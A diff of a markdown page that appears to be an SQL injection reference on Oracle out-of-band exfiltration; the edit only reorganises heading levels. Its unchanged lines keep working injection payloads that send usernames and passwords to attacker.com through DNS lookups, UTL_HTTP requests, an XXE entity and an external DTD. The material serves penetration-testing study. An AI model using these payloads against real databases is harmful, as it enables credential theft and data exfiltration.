@@ -7,11 +7,9 @@ tags: ["oob", "exfiltration", "data extraction", "alternative channels"]
 lastUpdated: 2025-03-15
 ---
 
-## Out Of Band Channeling
-
 Out-of-Band (OOB) techniques provide a powerful method for data extraction when traditional SQL injection methods are limited. These techniques use alternative channels, such as DNS, HTTP, or email, to exfiltrate data from the database without relying on the application's direct response.
 
-### Oracle OOB Mechanisms
+## Oracle OOB Mechanisms
 
 Oracle provides several packages that can be used for OOB data exfiltration:
 
@@ -24,7 +22,7 @@ Oracle provides several packages that can be used for OOB data exfiltration:
 | `DBMS_LDAP`   | `INIT`             | Connects to LDAP     | LDAP     | EXECUTE on DBMS_LDAP  |
 | `HTTPURITYPE` | `GETCLOB`          | Fetches HTTP content | HTTP(S)  | Basic privileges      |
 
-### DNS-Based Data Exfiltration
+## DNS-Based Data Exfiltration
 
 DNS-based techniques are often the most reliable as they can bypass many security restrictions:
 
@@ -36,7 +34,7 @@ DNS-based techniques are often the most reliable as they can bypass many securit
 ' AND UTL_INADDR.GET_HOST_ADDRESS('data.'||(SELECT username||'.'||password FROM users WHERE rownum=1)||'.attacker.com')--
 ```
 
-### HTTP-Based Data Exfiltration
+## HTTP-Based Data Exfiltration
 
 HTTP requests can send data directly to an attacker-controlled server:
 
@@ -48,9 +46,9 @@ HTTP requests can send data directly to an attacker-controlled server:
 ' AND UTL_HTTP.REQUEST('http://attacker.com/data?d='||UTL_RAW.CAST_TO_VARCHAR2(UTL_ENCODE.BASE64_ENCODE(UTL_RAW.CAST_TO_RAW((SELECT username FROM users WHERE rownum=1)))))--
 ```
 
-### SQL Injection Examples
+## SQL Injection Examples
 
-#### DNS Exfiltration
+### DNS Exfiltration
 
 ```sql
 -- Extracting usernames via DNS
@@ -60,7 +58,7 @@ HTTP requests can send data directly to an attacker-controlled server:
 ' UNION SELECT EXTRACTVALUE(XMLTYPE('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE rownum=1)||'.attacker.com/"> %remote;]>'),'/l') FROM dual--
 ```
 
-#### HTTP Exfiltration
+### HTTP Exfiltration
 
 ```sql
 -- Using HTTPURITYPE
@@ -78,7 +76,7 @@ HTTP requests can send data directly to an attacker-controlled server:
   END;--
 ```
 
-### Email Exfiltration
+## Email Exfiltration
 
 Using UTL_SMTP to send data via email:
 
@@ -101,7 +99,7 @@ Using UTL_SMTP to send data via email:
   END;--
 ```
 
-### TCP Socket Exfiltration
+## TCP Socket Exfiltration
 
 Using UTL_TCP to send data over raw TCP:
 
@@ -120,9 +118,9 @@ Using UTL_TCP to send data over raw TCP:
   END;--
 ```
 
-### Advanced Techniques
+## Advanced Techniques
 
-#### XML External Entity (XXE) Exfiltration
+### XML External Entity (XXE) Exfiltration
 
 Using XXE to exfiltrate data:
 
@@ -144,7 +142,7 @@ Where evil.dtd on attacker.com contains:
 %payload;
 ```
 
-#### Using Java in the Database
+### Using Java in the Database
 
 If Java is enabled:
 
@@ -168,7 +166,7 @@ If Java is enabled:
   END;--
 ```
 
-### Extracting Large Volumes of Data
+## Extracting Large Volumes of Data
 
 For extracting large datasets:
 
@@ -194,9 +192,9 @@ For extracting large datasets:
   END;--
 ```
 
-### Bypassing Restrictions
+## Bypassing Restrictions
 
-#### Overcoming Network Restrictions
+### Overcoming Network Restrictions
 
 ```sql
 -- Testing for outbound connectivity
@@ -206,7 +204,7 @@ For extracting large datasets:
 ' AND UTL_HTTP.REQUEST('http://attacker.com:8080/data?d='||(SELECT username FROM users WHERE rownum=1))--
 ```
 
-#### Handling Data Encoding Issues
+### Handling Data Encoding Issues
 
 ```sql
 -- URL encoding sensitive data
